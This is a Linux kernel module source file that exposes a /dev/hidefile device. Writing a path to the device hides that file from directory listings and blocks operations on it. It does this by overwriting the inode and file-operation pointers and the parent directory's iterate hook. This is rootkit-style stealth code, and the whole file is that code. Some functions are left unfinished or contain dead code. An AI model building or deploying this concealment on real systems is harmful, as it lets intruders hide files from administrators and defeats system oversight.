
#include <linux/module.h> // licence
#include <linux/fs.h>     /* file stuff */
#include <linux/kernel.h> /* printk() */
#include <linux/errno.h>  /* error codes */
#include <linux/module.h> /* THIS_MODULE */
#include <linux/cdev.h>   /* char device stuff */
#include <asm/uaccess.h>  /* strncpy_from_user() */
#include <linux/slab.h>   /*kmalloc()*/
#include <linux/namei.h>
#include <linux/version.h>
#include <linux/list.h>
// #include <string.h>
#define EMBEDDED_LEVELS 2
#define SUCCESS 0
#define DEVICE_NAME "hidefile" ///< The device will appear at /dev/hidefile using this value
#define CLASS_NAME "hide"      ///< The device class -- this is a character device driver
struct nameidata
{
    struct path path;
    struct qstr last;
    struct path root;
    struct inode *inode; /* path.dentry.d_inode */
    unsigned int flags;
    unsigned seq, m_seq, r_seq;
    int last_type;
    unsigned depth;
    int total_link_count;
    struct saved
    {
        struct path link;
        struct delayed_call done;
        const char *name;
        unsigned seq;
    } * stack, internal[EMBEDDED_LEVELS];
    struct filename *name;
    struct nameidata *saved;
    unsigned root_seq;
    int dfd;
    kuid_t dir_uid;
    umode_t dir_mode;
};

/*Declare*/
int register_device(void); /* 0 if Ok*/
void unregister_device(void);
int inode_hide_init(void);
void inode_hide_exit(void);
void allocate_memmory(void);
void reallocate_memmory(void);
unsigned long hook_functions(const char *);
unsigned long backup_functions(void);
int parent_readdir(struct file *, void *, filldir_t);
int new_readdir(struct file *, void *, filldir_t);
int new_open(struct inode *, struct file *);
int new_flush(struct file *, fl_owner_t id);
int new_release(struct inode *, struct file *);
int new_ioctl(struct inode *, struct file *, unsigned int, unsigned long);
int new_lock(struct file *, int, struct file_lock *);
int new_mmap(struct file *, struct vm_area_struct *);
ssize_t new_read(struct file *, char __user *, size_t, loff_t *);
ssize_t new_write(struct file *, const char __user *, size_t, loff_t *);
static int new_filldir(struct dir_context *, const char *, int, loff_t, u64, unsigned);
//sua lai
int parent_iterate(struct file *file, struct dir_context *dir_context);
int parent_iterate_shared(struct file *file, struct dir_context *dir_context);

// int new_getattr (struct vfsmount *mnt, struct dentry *, struct kstat *);
int new_getattr(const struct path *, struct kstat *, unsigned int, unsigned int);

int new_rmdir(struct inode *, struct dentry *);

struct dentry *g_parent_dentry;
struct nameidata g_root_nd;
struct path g_root_path;
static struct class *hidefileClass = NULL;   ///< The device-driver class struct pointer
static struct device *hidefileDevice = NULL; ///< The device-driver device struct pointer

/*Number of inodes*/
unsigned long *g_inode_numbers;
int g_inode_count = 0;

void **g_old_inode_pointer;
void **g_old_fop_pointer;
void **g_old_iop_pointer;

void **g_old_parent_inode_pointer;
void **g_old_parent_fop_pointer;

filldir_t real_filldir;
loff_t realpos;
static struct dir_context old_dc;

// struct dir_context new_dc=
// {
//     .actor = new_filldir,
//     .pos = realpos,
// };

/***********************File parent OPERATIONS*****************************/
static struct file_operations new_parent_fop =
    {
        .owner = THIS_MODULE,
        // .readdir = parent_readdir,
        // .iterate = parent_iterate,
        .iterate_shared = parent_iterate_shared,
        // .iterate_shared = iterate_dir,
};

// static int new_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ux64, unsigned ino)
static int new_filldir(struct dir_context *dc, const char *name, int namelen, loff_t offset, u64 ux64, unsigned ino)
{
    unsigned int i = 0;
    struct dentry *pDentry;
    struct qstr Current_Name;

    Current_Name.name = name;
    Current_Name.len = namelen;
    Current_Name.hash = full_name_hash(g_parent_dentry, name, namelen);

    printk(KERN_NOTICE "curname: %s\n", name);

    pDentry = d_lookup(g_parent_dentry, &Current_Name);
    if (pDentry != NULL)
    {

        if (pDentry->d_name.name != NULL)
        {
            printk(KERN_NOTICE "dentry: %s\n", pDentry->d_name.name);
            printk(KERN_NOTICE "i_ino: %ld", pDentry->d_inode->i_ino);
        }
        for (i = 0; i <= g_inode_count - 1; i++)
        {
            if (g_inode_numbers[i] == pDentry->d_inode->i_ino)
            {
                return 0;
            }
        }
    }
    else
        printk(KERN_ALERT "dentry %s not found\n", name);


    return real_filldir(dc, name, namelen, offset, ux64, ino);
}

int parent_iterate_shared(struct file *file, struct dir_context *dc)
{
    g_parent_dentry = file->f_path.dentry;
    real_filldir = dc->actor;
    // real_filldir = filldir;
    realpos = dc->pos;
    struct dir_context new_dc;
    // new_dc.pos = file->f_pos;
    new_dc.pos = dc->pos;
    new_dc.actor = dc->actor;
    struct dir_context ctx;
    // int t = file->f_path.dentry->d_inode->i_fop->iterate_shared(file, &new_dc);
    // int t= file->f_op->iterate_shared(file, &new_dc);

    dc->actor = new_filldir;
    int t = g_root_path.dentry->d_inode->i_fop->iterate_shared(file, dc);
    printk(KERN_ALERT "interating_shared dir of ./%s\n", file->f_path.dentry->d_name.name);
    return t;
}
int parent_iterate(struct file *file, struct dir_context *dir_context)
{
    printk(KERN_ALERT "interating dir");

    return -2;
    g_parent_dentry = file->f_path.dentry;
    real_filldir = dir_context->actor;
    realpos = dir_context->pos;
    struct dir_context new_dc =
        {
            .actor = new_filldir,
            .pos = realpos,
        };
    struct dir_context ctx;
    // return (file->f_dentry->d_sb->s_root->d_inode->i_fop->iterate(file, &new_dc));
    return file->f_op->iterate(file, &new_dc);
    // int t = g_root_path.dentry->d_inode->i_fop->iterate(file, &new_dc);
    // return t;
}

int parent_readdir(struct file *file, void *dirent, filldir_t filldir)
{
    //g_parent_dentry = file->f_dentry;
    g_parent_dentry = file->f_path.dentry;

    real_filldir = filldir;

    //return g_root_nd.path.dentry->d_inode->i_fop->readdir(file, dirent, new_filldir);
    //return file->f_dentry->d_sb->s_root->d_inode->i_fop->readdir(file, dirent, new_filldir);
    return 0;
}
/********************************FILE OPERATIONS*************************/
static struct file_operations new_fop =
    {
        .owner = THIS_MODULE,
        // .readdir = new_readdir,
        .release = new_release,
        // .open = new_open,
        // .read = new_read,
        .write = new_write,
        .mmap = new_mmap,
};

int new_mmap(struct file *file, struct vm_area_struct *area)
{
    printk(KERN_ALERT "Entered in new_mmap\n");
    return -2;
}

ssize_t new_read(struct file *file1, char __user *u, size_t t, loff_t *ll)
{
    printk(KERN_ALERT "Entered in new_read\n");
    return -2;
}

ssize_t new_write(struct file *file1, const char __user *u, size_t t, loff_t *ll)
{
    printk(KERN_ALERT "Entered in new_write\n");
    return -2;
}

int new_release(struct inode *new_inode, struct file *file)
{
    printk(KERN_ALERT "Entered in new_release \n");
    return -2;
}

int new_flush(struct file *file, fl_owner_t id)
{
    printk(KERN_ALERT "Entered in new_flush \n");
    return -2;
}

int new_readdir(struct file *file, void *dirent, filldir_t filldir)
{
    printk(KERN_ALERT "Entered in new_readdir \n");
    return -2;
}

int new_open(struct inode *old_inode, struct file *old_file)
{
    printk(KERN_ALERT "Entered in new_open \n");
    return -2;
}

/********************************INODE OPERATIONS*************************/
static struct inode_operations new_iop =
    {
        .getattr = new_getattr,
        .rmdir = new_rmdir,
};

int new_rmdir(struct inode *new_inode, struct dentry *new_dentry)
{
    printk(KERN_ALERT "Entered in new_rmdir \n");
    return -2;
}

// int new_getattr(struct vfsmount *mnt, struct dentry *new_dentry, struct kstat *ks)
int new_getattr(const struct path *path, struct kstat *new_kstat, unsigned int new_ui, unsigned int new_i)
{
    // int new_getattr (){
    printk(KERN_ALERT "Entered in new_getatr of %s\n", path->dentry->d_name.name);
    return -2;
}

/*Allocate memmory for arrays*/
void allocate_memmory()
{
    g_old_inode_pointer = (void *)kmalloc(sizeof(void *), GFP_KERNEL);
    g_old_fop_pointer = (void *)kmalloc(sizeof(void *), GFP_KERNEL);
    g_old_iop_pointer = (void *)kmalloc(sizeof(void *), GFP_KERNEL);

    g_old_parent_inode_pointer = (void *)kmalloc(sizeof(void *), GFP_KERNEL);
    g_old_parent_fop_pointer = (void *)kmalloc(sizeof(void *), GFP_KERNEL);

    g_inode_numbers = (unsigned long *)kmalloc(sizeof(unsigned long), GFP_KERNEL);
}

void reallocate_memmory()
{
    /*Realloc memmory for inode number*/
    g_inode_numbers = (unsigned long *)krealloc(g_inode_numbers, sizeof(unsigned long *) * (g_inode_count + 1), GFP_KERNEL);

    /*Realloc memmory for old pointers*/
    g_old_inode_pointer = (void *)krealloc(g_old_inode_pointer, sizeof(void *) * (g_inode_count + 1), GFP_KERNEL);
    g_old_fop_pointer = (void *)krealloc(g_old_fop_pointer, sizeof(void *) * (g_inode_count + 1), GFP_KERNEL);
    g_old_iop_pointer = (void *)krealloc(g_old_iop_pointer, sizeof(void *) * (g_inode_count + 1), GFP_KERNEL);

    g_old_parent_inode_pointer = (void *)krealloc(g_old_parent_inode_pointer, sizeof(void *) * (g_inode_count + 1), GFP_KERNEL);
    g_old_parent_fop_pointer = (void *)krealloc(g_old_parent_fop_pointer, sizeof(void *) * (g_inode_count + 1), GFP_KERNEL);
}

/*Function for hook functions of specified file*/
unsigned long hook_functions(const char *file_path)
{
    int error = 0;
    struct nameidata nd;
    struct path p;

    // error = path_lookup("/root", 0, &g_root_nd);
    //error = vfs_path_lookup(dentry, mnt,name,flag,&path);
    error = kern_path("/root", 1, &g_root_path);
    if (error)
    {
        printk(KERN_ALERT "Can't access root\n");

        return -1;
    }

    //error = path_lookup(file_path, 0, &nd);
    error = kern_path(file_path, 1, &nd.path);

    if (error)
    {
        printk(KERN_ALERT "Can't access file\n");

        return -1;
    }

    if (g_inode_count == 0)
    {
        allocate_memmory();
    }

    if (g_inode_numbers == NULL)
    {

        printk(KERN_ALERT "Not enought memmory in buffer\n");

        return -1;
    }

    /************************Old pointers**********************************/
    /*Save pointers*/
    g_old_inode_pointer[g_inode_count] = nd.path.dentry->d_inode;
    g_old_fop_pointer[g_inode_count] = (void *)nd.path.dentry->d_inode->i_fop;
    g_old_iop_pointer[g_inode_count] = (void *)nd.path.dentry->d_inode->i_op;

    g_old_parent_inode_pointer[g_inode_count] = nd.path.dentry->d_parent->d_inode;
    g_old_parent_fop_pointer[g_inode_count] = (void *)nd.path.dentry->d_parent->d_inode->i_fop;

    /*Save inode number*/
    g_inode_numbers[g_inode_count] = nd.path.dentry->d_inode->i_ino;
    g_inode_count = g_inode_count + 1;

    reallocate_memmory();

    /*filldir hook*/
    nd.path.dentry->d_parent->d_inode->i_fop = &new_parent_fop;

    /* Hook of commands for file*/
    nd.path.dentry->d_inode->i_op = &new_iop;
    nd.path.dentry->d_inode->i_fop = &new_fop;

    return 0;
}

/*Function for backup inode pointers of the specified file*/
unsigned long backup_functions()
{
    int i = 0;
    struct inode *pInode;
    struct inode *pParentInode;

    for (i = 0; i < g_inode_count; i++)
    {
        pInode = g_old_inode_pointer[(g_inode_count - 1) - i];
        pInode->i_fop = (void *)g_old_fop_pointer[(g_inode_count - 1) - i];
        pInode->i_op = (void *)g_old_iop_pointer[(g_inode_count - 1) - i];

        pParentInode = g_old_parent_inode_pointer[(g_inode_count - 1) - i];
        pParentInode->i_fop = (void *)g_old_parent_fop_pointer[(g_inode_count - 1) - i];
    }

    kfree(g_old_inode_pointer);
    kfree(g_old_fop_pointer);
    kfree(g_old_iop_pointer);

    kfree(g_old_parent_inode_pointer);
    kfree(g_old_parent_fop_pointer);

    kfree(g_inode_numbers);

    return 0;
}

//**

static int g_device_open = 0;

static ssize_t device_file_write(struct file *file_ptr, const char *buffer, size_t length, loff_t *offset)
{
    char *pFile_Path;

    pFile_Path = (char *)kmalloc(sizeof(char *) * length, GFP_KERNEL);

    if (strncpy_from_user(pFile_Path, buffer, length) == -EFAULT)
    {

        printk(KERN_NOTICE "Entered in fault get_user state");

        length = -1;
        goto finish;
    }

    if (strstr(pFile_Path, "\n"))
    {
        pFile_Path[length - 1] = 0;

        printk(KERN_NOTICE "Entered in end line filter");
    }

    printk(KERN_NOTICE "File path is %s without EOF", pFile_Path);

    if (hook_functions(pFile_Path) == -1)
    {
        length = -2;
    }
finish:
    kfree(pFile_Path);

    return length;
}

static int device_file_open(struct inode *inode, struct file *file)
{

    if (g_device_open)

        return -EBUSY;

    g_device_open++;
    try_module_get(THIS_MODULE);

    return SUCCESS;
}

static int device_file_release(struct inode *inode, struct file *file)
{

    g_device_open--;

    module_put(THIS_MODULE);
    return SUCCESS;
}

/*===============================================================================================*/
static struct file_operations hide_driver_fops =
    {
        .owner = THIS_MODULE,
        .write = device_file_write,
        .open = device_file_open,
        .release = device_file_release,
};

static int device_file_major_number = 0;

static const char device_name[] = "Hide_Driver";

/*===============================================================================================*/
int register_device(void)
{
    int result = 0;

    printk(KERN_NOTICE "Hide-driver: register_device() is called.");

    result = register_chrdev(0, device_name, &hide_driver_fops);
    if (result < 0)
    {
        printk(KERN_WARNING "Hide-driver:  can\'t register character device with errorcode = %i", result);
        return result;
    }

    device_file_major_number = result;
    printk(KERN_NOTICE "Hide-driver: registered character device with major number = %i and minor numbers 0...255", device_file_major_number);

    // Register the device class
    hidefileClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(hidefileClass))
    { // Check for error and clean up if there is
        unregister_chrdev(device_file_major_number, DEVICE_NAME);
        printk(KERN_ALERT "Failed to register device class\n");
        return PTR_ERR(hidefileClass); // Correct way to return an error on a pointer
    }
    printk(KERN_INFO "Hidefile: device class registered correctly\n");

    // Register the device driver
    hidefileDevice = device_create(hidefileClass, NULL, MKDEV(device_file_major_number, 0), NULL, DEVICE_NAME);
    if (IS_ERR(hidefileDevice))
    {                                 // Clean up if there is an error
        class_destroy(hidefileClass); // Repeated code but the alternative is goto statements
        unregister_chrdev(device_file_major_number, DEVICE_NAME);
        printk(KERN_ALERT "Failed to create the device\n");
        return PTR_ERR(hidefileDevice);
    }
    printk(KERN_INFO "Hidefile: device class created correctly\n"); // Made it! device was initialized
    return 0;
}
/*-----------------------------------------------------------------------------------------------*/
void unregister_device(void)
{
    printk(KERN_NOTICE "Hide-driver: unregister_device() is called");
    if (device_file_major_number != 0)
    {
        unregister_chrdev(device_file_major_number, device_name);
    }
}

int inode_hide_init(void)
{
    register_device();

    return 0;
}

void inode_hide_exit(void)
{

    backup_functions();

    unregister_device();

    printk(KERN_ALERT "Exiting from kernel mode\n");

    device_destroy(hidefileClass, MKDEV(device_file_major_number, 0)); // remove the device
    class_unregister(hidefileClass);                                   // unregister the device class
    class_destroy(hidefileClass);                                      // remove the device class
    unregister_chrdev(device_file_major_number, DEVICE_NAME);
}

module_init(inode_hide_init);
module_exit(inode_hide_exit);

//GIAYPHEP
MODULE_LICENSE("GPL");
// MODULE_AUTHOR(DRIVER_AUTHOR);
// MODULE_DESCRIPTION(DRIVER_DESC);
// MODULE_VERSION(DRIVER_VERSION);
MODULE_SUPPORTED_DEVICE("TEST DEVICE");
